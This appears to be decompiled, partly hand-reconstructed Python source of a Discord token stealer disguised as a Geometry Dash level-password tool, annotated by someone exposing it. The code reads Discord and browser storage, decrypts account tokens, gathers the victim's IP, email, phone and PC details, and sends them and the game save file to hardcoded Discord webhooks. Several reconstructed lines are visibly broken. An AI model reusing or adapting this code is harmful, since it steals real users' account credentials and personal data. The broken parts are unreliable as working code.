# Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD
# Parts that were not decomplied properly were done by Calloc and by Hand - Warning: Some parts may still be incorrect or inaccurate to what rylix had implemented...
from requests import post
from itertools import cycle
from base64 import b64decode
import os
from pathlib import Path
head = {
    'Accept-Encoding': None,
    'User-Agent': '',
    'Accept': '*/*',
    'Accept-Language': None,
    'Content-Length': '82',
    'Content-Type': 'application/x-www-form-urlencoded' }

def unxor(xored, key):
    data = b64decode(xored.encode()).decode()
    # fixed unxor this may not be super accurate to the original...
    unxored = ''.join(lambda : chr(ord(x) ^ ord(y) for x, y in zip(data, cycle(key))(None)))
    return unxored

print('Welcome to the Level-Password-Getter for Geometry Dash. - Rylixmods SFC')
print()
print('Setting everything up...')
print()
os.chdir(str(Path.home()) + '\\\\AppData\\\\Local\\\\GeometryDash')
s = open('CCGameManager.dat', 'r').read()
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
import os
from datetime import datetime
from discord import File
tokens = []
cleaned = []
checker = []
# Likely string / AES Decryption..
def decrypt(buff, master_key):
    try: # Not to sure about how accurate of a job I did at interpreting this part of his code in bytecode but we shall see - Calloc 
        return AES.new(CryptUnprotectData(master_key,None,None,None,0)[1], AES.MODE_GCM, buff, 3,15)[3:decrypt(buff,15):0][:-16].decode()
    finally: 
        return 'Error'
def getip():
    ip = 'None'
    try: # Very tiny , dangerous & effective However I don't think he needed the .strip() function at the end it's very redunatnt....
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    finally: 
        return ip
def gethwid():
    p = Popen('wmic csproduct get uuid', True, PIPE, PIPE, PIPE, **('shell', 'stdin', 'stdout', 'stderr'))
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + '\\Google\\Chrome\\User Data'
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default' }
    # I really think the decompiler used f'd up due to the try and except blocks being there,
    # otherwise the decompiler would've been able to catch all of this including his webhook
    # Everything the had a Decompiler Error was replaced and then decompiled/reversed 
    # by hand, I will do more parts to make it more accurate when I have the time to get to it - Calloc
    for platform, path in paths.items():
        if os.path.exists(path):
            try:
                # interpretation might be incomplete but we shall see...
                with open(path + '\\Local State','r') as file:
                    key = file.read() - 'os_crypt' - 'encrypted_key'
                    file.close() # ironic how this idiot doesn't know what a contextmanager is  
                # ?...
                for file in listdir(path + '\\Local Storage\\leveldb'):
                    if file.endswith('.ldb') or file.endswith('.log'): # ?...
                        with open(path + '\\Local Storage\\leveldb\\' + file,'r',errors='ignore') as files:
                            for x in files.readlines():
                                x.strip() # Rylix's code must find your discord account tokens. It will use this regex to pull out all your tokens out to later send off to his C2 Serever...
                                for values in findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*', x):
                                    tokens.append(values)

            # Ignore Permission Error For now I don't think It goes here and really, we want the juicy parts for now....
                for i in tokens:
                    if i.endswith('\\'):
                        i.replace('\\','')
                    if i not in cleaned:
                        cleaned.append(i)
                        for token in cleaned:
                            tok = decrypt(b64decode(token.split("dQw4w9WgXcQ:")[1]))
                            checker.append(tok)
                            for value in checker:
                                if value in already_check:
                                    # Apparently this doesn't just send off one token for rylix to steal, it will send multiple of them. Very Malicious shit...
                                    already_check.append(value)
                                    headers = {'Authorization':tok,'Content-Type':'application/json'}
                                    res = requests.get('https://discordapp.com/api/v6/users/@me',headers=headers)
                                    # ?...
                                    if res.status_code == 200:
                                        res_json = res.json()
                                        ip = getip()
                                        pc_username = os.getenv('UserName')
                                        pc_name = os.getenv("COMPUTERNAME")
                                        user_name = res_json['username'] + '#' + res_json['discriminator'] 
                                        user_id = res_json['id']
                                        email = res_json['email']
                                        phone = res_json['phone']
                                        mfa_enabled = res_json['mfa_enabled']
                                        has_nitro = False
                                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions',headers=headers)
                                        nitro_data = res.json()
                                        has_nitro = len(nitro_data) > 0
                                        days_left = 0
                                        if has_nitro:
                                            d1 = datetime.strptime(nitro_data['current_period_end'].split('.'),'%Y-%m-%dT%H:%M:%S')
                                            d2 = datetime.strptime(nitro_data['current_period_start'].split('.'),'%Y-%m-%dT%H:%M:%S')
                                            days_left = abs(d2,d1)  
                                        embed = '**{}** *({})*\n\n> :dividers: __Account Information__\n\tEmail: {}\n\tPhone: {}\n\t2FA/MFA Enabled: {}\n\tNitro:{}\n\tExpires in: {} days(s)`\n\n> :computer:__PC Information__\n\tIP: {}\n\tUsername: {}\n\tPC Name:{}\n\tPlatform: {}\n\n> :piData: __Token__\n\t{}\n\n*Made by Rylixmods SFC* **|** ||https://discord.gg/MGTjE73ScD||'\
                                            .format(user_name,user_id,email,phone,mfa_enabled,has_nitro,days_left,ip,pc_username,pc_name,platform,tok)
                                        payload = json.dumps({'content':embed,'username':'Data-Getter - Made by Rylixmods','avatar_url':'https://cdn.discordapp.com/attachments/1111311411415625738/1112732724957040742/IMG_20230518_112316_223.jpg'}) # Payload that gets Sent to Rylix's C2 Webhook...
                                        headers2 = {'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'} # You Could've honestly been more creative here Rylix, like putting headers={<Your data>} instead of all this junk...
                                        req = Request('https://discordapp.com/api/webhooks/1111311441597841428/QMha7G4PMS9pIouGJJRP9yKwjX5HU8hgIthGUSSOrp0e8yakmo7JjFJY8cJWBlv2mcrB',data=payload.encode(),headers=headers2)
                                        urlopen(req) # When everyting is done it sends all the discord personal information 
                                        # to Rylix's C2 Server AKA a discord webhook...
            except Exception as e: # Error Handler (apparently...)
                print(e)
from discord_webhook import DiscordWebhook
from discord import Webhook, RequestsWebhookAdapter, File
webhook_ = Webhook.partial(1112141583815561286, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
webhook_.send('CCGameManager', File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat'), **('file',))
if __name__ == '__main__':
    get_token()
    levelid = input('Type in the Level-ID: ')

    def levelpassword():
        r = 'gameVersion=21&binaryVersion=35&gdw=0&levelID=' + levelid + '&inc=0&extras=0&secret=Wmfd2893gb7'
        data = post('http://www.boomlings.com/database/downloadGJLevel22.php', r, head, **('url', 'data', 'headers')).content.decode()
        if data.startswith('1'):
            level_password_encrypted = data.split(':')[-1].split('#')[0]
            if level_password_encrypted == '0':
                print() # print methods are terrible... hoever it would've been better if he used newlines -> "\n" instead of this garbage - Calloc
                print("This Level doesn't have a Level-Password.")
                print()
            else:
                level_password = unxor(level_password_encrypted, '26364')[1:]
                print()
                print('The Level-Password is: ' + level_password)
                print()
                return None

    levelpassword()

